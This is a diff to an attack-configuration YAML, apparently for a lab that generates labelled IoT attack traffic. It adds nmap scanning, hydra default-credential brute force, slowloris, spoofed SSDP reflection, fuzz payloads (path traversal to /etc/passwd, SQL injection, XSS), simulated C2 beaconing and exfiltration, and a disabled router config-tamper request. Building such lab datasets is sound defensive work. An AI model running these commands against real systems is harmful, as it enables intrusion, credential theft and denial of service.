@@ -57,6 +57,155 @@ attacks:
     repeats: 3
     duration_seconds: 60
 
+  # Reconnaissance / Discovery (#75)
+  - name: nmap_service_detection
+    label: Nmap_Service_Detection
+    enabled: true
+    repeats: 3
+    command:
+      - nmap
+      - -sV
+      - -p
+      - 1-1000
+      - "{target_ip}"
+
+  - name: ssdp_discovery
+    label: SSDP_Discovery
+    kind: ssdp_discovery
+    enabled: true
+    repeats: 3
+    timeout_seconds: 3
+
+  - name: banner_grab_http
+    label: Banner_Grab_HTTP
+    kind: banner_grab
+    enabled: true
+    repeats: 3
+    port: 80
+    timeout_seconds: 5
+    probe: "HEAD / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n"
+
+  # Credential Access (#76)
+  - name: hydra_http_default_creds
+    label: Hydra_HTTP_Default_Creds
+    kind: hydra_brute_force
+    enabled: true
+    repeats: 3
+    service: http-get
+    port: 80
+    username_list:
+      - admin
+      - root
+    password_list:
+      - admin
+      - "1234"
+      - password
+    max_attempts: 6
+    tasks: 1
+
+  # Application-layer (#77)
+  - name: slowloris
+    label: Slowloris
+    enabled: true
+    repeats: 3
+    command:
+      - slowhttptest
+      - -c
+      - "1000"
+      - -H
+      - -i
+      - "10"
+      - -r
+      - "200"
+      - -t
+      - GET
+      - -u
+      - http://{target_ip}/
+      - -x
+      - "24"
+      - -p
+      - "3"
+
+  - name: http_fuzz
+    label: HTTP_Fuzz
+    kind: http_fuzz
+    enabled: true
+    repeats: 3
+    port: 80
+    paths:
+      - /../../../../etc/passwd
+      - /..%2f..%2f..%2f..%2fetc%2fpasswd
+      - "/'; DROP TABLE users;--"
+      - "/<script>alert(1)</script>"
+      - /%00
+      - /.git/config
+    timeout_seconds: 5
+
+  # Lateral Movement / C2 (#78)
+  - name: c2_beacon
+    label: C2_Beacon
+    kind: c2_beacon
+    enabled: true
+    repeats: 5
+    port: 80
+    path: /check-in
+    jitter_seconds: 5
+    timeout_seconds: 5
+
+  # Exfiltration (#79)
+  - name: exfil_sim
+    label: Exfil_Sim
+    kind: exfil_sim
+    enabled: true
+    repeats: 3
+    port: 80
+    path: /upload
+    payload_size_bytes: 2000000
+    chunk_size_bytes: 65536
+    timeout_seconds: 10
+
+  # Reflection/Amplification DDoS (#81)
+  # 192.168.1.250 is a decoy spoofed-victim IP, not a real device on this
+  # lab network - it is not present in devices.yaml. DNS/NTP reflection are
+  # deliberately not included here: the lab devices are consumer IoT
+  # hardware (hubs/cams/plugs) that expose UPnP/SSDP, not open DNS
+  # resolvers or NTP servers, so spoofed DNS/NTP queries at them wouldn't
+  # elicit any real amplified response - just non-functional traffic.
+  - name: ssdp_reflection
+    label: SSDP_Reflection
+    enabled: true
+    repeats: 3
+    command:
+      - hping3
+      - --spoof
+      - 192.168.1.250
+      - --udp
+      - -c
+      - "5"
+      - -p
+      - "1900"
+      - -E
+      - configs/payloads/ssdp_msearch.txt
+      - "{target_ip}"
+
+  # Impact beyond flooding (#80)
+  # Left disabled by default (and the config_tamper kind itself defaults to
+  # enabled: false at the model level) - the request below is real and
+  # protocol-correct, but whether it actually changes anything depends on
+  # each specific device's firmware. Do not flip enabled: true without
+  # vetting this exact path/body against the specific device it will run
+  # against; a payload that succeeds could brick real lab hardware.
+  - name: config_tamper_setup_cgi
+    label: Config_Tamper_Setup_CGI
+    kind: config_tamper
+    enabled: false
+    repeats: 1
+    port: 80
+    path: /setup.cgi
+    method: POST
+    body: "ssid=capex-test&wpa_psk=capex-test-tamper"
+    timeout_seconds: 5
+
   # ARP Spoofing / MITM (#82)
   # interface/gateway_ip are placeholders - verify these match the actual
   # lab NIC and router address before enabling.
